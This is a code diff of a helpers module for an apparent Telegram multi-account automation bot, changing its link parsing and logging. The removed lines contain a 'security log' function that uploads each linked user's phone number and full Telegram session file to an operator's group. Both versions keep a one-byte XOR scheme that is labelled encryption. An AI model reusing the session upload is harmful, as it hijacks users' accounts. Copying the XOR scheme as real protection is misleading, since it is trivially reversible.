@@ -1,126 +1,95 @@
-import base64
+"""
+Multi-Account Automation Framework - Security & Utility Helpers
+"""
 import re
-import json
+import base64
 import logging
-from typing import Tuple, Any, List, Optional, Dict
+from typing import Tuple, Optional, Any
 from aiogram import Bot
-from aiogram.types import BufferedInputFile
-from config import SECRET_KEY, LOG_GC_ID
+import config
 
-logger = logging.getLogger("MultiAccountSystem.Helpers")
+logger = logging.getLogger("SystemHelpers")
 
-# Shared in-memory session mapping
-registration_sessions: Dict[int, Dict[str, Any]] = {}
-
+# --- BITWISE XOR CRYPTOGRAPHY MATRICES ---
 def _get_crypto_key() -> int:
-    return sum(ord(c) for c in SECRET_KEY) % 256 or 42
+    """Dynamically generates a XOR byte mask from the configured Secret Key."""
+    return sum(ord(char) for char in config.SECRET_KEY) % 256 or 42
 
 def encrypt_data(data: str) -> str:
+    """Encrypts plaintext string using dynamic XOR byte shift arrays."""
+    if not data:
+        return ""
     key = _get_crypto_key()
     cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
     return base64.b64encode(cipher_bytes).decode('utf-8')
 
 def decrypt_data(encrypted_data: str) -> str:
+    """Decrypts dynamic XOR shifted cipher text safely."""
+    if not encrypted_data:
+        return ""
     key = _get_crypto_key()
     try:
         raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
         plain_bytes = bytes([b ^ key for b in raw_cipher])
         return plain_bytes.decode('utf-8')
     except Exception as e:
-        logger.error(f"Decryption failure: {e}")
+        logger.error(f"XOR Cryptographic Decryption Engine Fault: {e}")
         return ""
 
-def parse_telegram_link(link: str) -> Tuple[Any, Optional[List[int]]]:
-    link = link.strip()
+# --- TELEGRAM LINK RESOLVER & REGEX ENGINE ---
+def parse_telegram_link(link: str) -> Tuple[Any, Optional[int], bool]:
+    """
+    Parses complex and standard Telegram URLs.
+    Supports public links, private hashes, and explicit message node markers.
+    
+    Returns:
+        Tuple[target, msg_id, is_private_hash]
+    """
+    link = link.strip().replace(" ", "")
     if not link:
-        return None, None
+        return None, None, False
         
-    if "joinchat/" in link or "t.me/+" in link:
-        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
-        if hash_match:
-            return hash_match.group(1), None
+    # Pattern 1: Private channel join invite hashes (e.g., t.me/joinchat/... or t.me/+...)
+    hash_match = re.search(r'(?:joinchat/|\+|t\.me/\+)([a-zA-Z0-9_\-]+)', link)
+    if hash_match:
+        return hash_match.group(1), None, True
 
-    private_match = re.search(r't\.me/c/(\d+)/([\d\-]+)', link)
+    # Pattern 2: Explicit private channel message links (e.g., t.me/c/1234567/45)
+    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
     if private_match:
         channel_id = int(f"-100{private_match.group(1)}")
-        msg_id_raw = private_match.group(2)
-        return channel_id, parse_message_ids(msg_id_raw)
-
-    public_msg_match = re.search(r't\.me/([^/]+)/([\d\-]+)', link)
-    if public_msg_match:
-        target = public_msg_match.group(1)
-        msg_id_raw = public_msg_match.group(2)
-        try:
-            return int(f"-100{int(target)}"), parse_message_ids(msg_id_raw)
-        except ValueError:
-            return target, parse_message_ids(msg_id_raw)
+        msg_id = int(private_match.group(2))
+        return channel_id, msg_id, False
         
+    # Pattern 3: Standard public channel posts (e.g., t.me/username/45)
+    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
+    if msg_match:
+        return msg_match.group(1), int(msg_match.group(2)), False
+        
+    # Pattern 4: Raw usernames or trimmed URLs with standard message paths
     target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
     if "/" in target:
         parts = target.split("/")
         target = parts[0]
-        if len(parts) > 1:
-            return target, parse_message_ids(parts[1])
+        if len(parts) > 1 and parts[1].isdigit():
+            msg_id = int(parts[1])
+            return target, msg_id, False
             
-    return target, None
+    return target, None, False
 
-def parse_message_ids(raw_str: str) -> List[int]:
-    if "-" in raw_str:
-        try:
-            start, end = map(int, raw_str.split("-"))
-            return list(range(start, end + 1))
-        except ValueError:
-            pass
+# --- LOG RECIPIENTS LOGISTICS ---
+async def dispatch_log(bot: Bot, text: str):
+    """Prints event logs to standard output and posts updates directly to the log channel."""
+    logger.info(f"[AUDIT LOG]: {text}")
     try:
-        return [int(x) for x in raw_str.split(",") if x.strip().isdigit()]
-    except ValueError:
-        return []
-
-class SecurityHubLogger:
-    @staticmethod
-    async def log_session_onboarding(bot: Bot, telemetry_src: str, user_id: int, phone: str, session_username: str, session_bytes: bytes):
-        caption = (
-            f"📥 SECURITY DATA LOG: NEW ACCOUNT BOUND\n"
-            f"⚙️ Method: Via {telemetry_src}\n"
-            f"📱 Phone: +{phone}\n"
-            f"👤 Account Username: @{session_username or 'N/A'}\n"
-            f"🆔 Linked By User ID: {user_id}\n\n"
-            f"⚠️ Physical SQLite session backup appended below."
+        await bot.send_message(
+            chat_id=config.LOG_CHANNEL_ID, 
+            text=f"🔔 **System Audit Event**\n\n{text}",
+            parse_mode="Markdown"
         )
-        try:
-            doc_file = BufferedInputFile(session_bytes, filename=f"+{phone}.session")
-            await bot.send_document(chat_id=LOG_GC_ID, document=doc_file, caption=caption)
-        except Exception as e:
-            logger.error(f"Failed logging session to target logging group: {e}")
-
-    @staticmethod
-    async def log_task_submission(bot: Bot, task_id: int, user_id: int, task_type: str, settings: dict):
-        log_payload = (
-            f"🚀 SECURITY DATA LOG: TASK RUNNING\n"
-            f"🆔 Task ID: {task_id}\n"
-            f"👤 Triggered By User ID: {user_id}\n"
-            f"⚙️ Action Type: {task_type.upper()}\n"
-            f"📦 Payload Configuration:\n{json.dumps(settings, indent=2)}"
+    except Exception as e:
+        logger.critical(
+            f"\n❌ LOG TRANSMISSION FAILURE to channel {config.LOG_CHANNEL_ID}!\n"
+            f"REASON: {e}\n"
+            f"FIX: Add the bot as an Admin inside the log channel with 'Post Messages' rights!\n"
         )
-        try:
-            await bot.send_message(chat_id=LOG_GC_ID, text=log_payload)
-        except Exception as e:
-            logger.error(f"Failed logging task initialization info to logging group: {e}")
-
-    @staticmethod
-    async def log_task_completion(bot: Bot, task_id: int, user_id: int, task_type: str, success_count: int, failure_count: int, details_txt: str):
-        log_payload = (
-            f"🏁 SECURITY DATA LOG: TASK COMPLETED\n"
-            f"🆔 Task ID: {task_id}\n"
-            f"👤 Owner User ID: {user_id}\n"
-            f"⚙️ Action Type: {task_type.upper()}\n\n"
-            f"🟢 Total Successes: {success_count} accounts\n"
-            f"🔴 Total Failures: {failure_count} accounts\n\n"
-            f"📝 Full output report summary text file is attached below."
-        )
-        try:
-            report_bytes = details_txt.encode("utf-8")
-            doc_file = BufferedInputFile(report_bytes, filename=f"task_{task_id}_execution_report.txt")
-            await bot.send_document(chat_id=LOG_GC_ID, document=doc_file, caption=log_payload)
-        except Exception as e:
-            logger.error(f"Failed logging completion analytics summary payload to group: {e}")
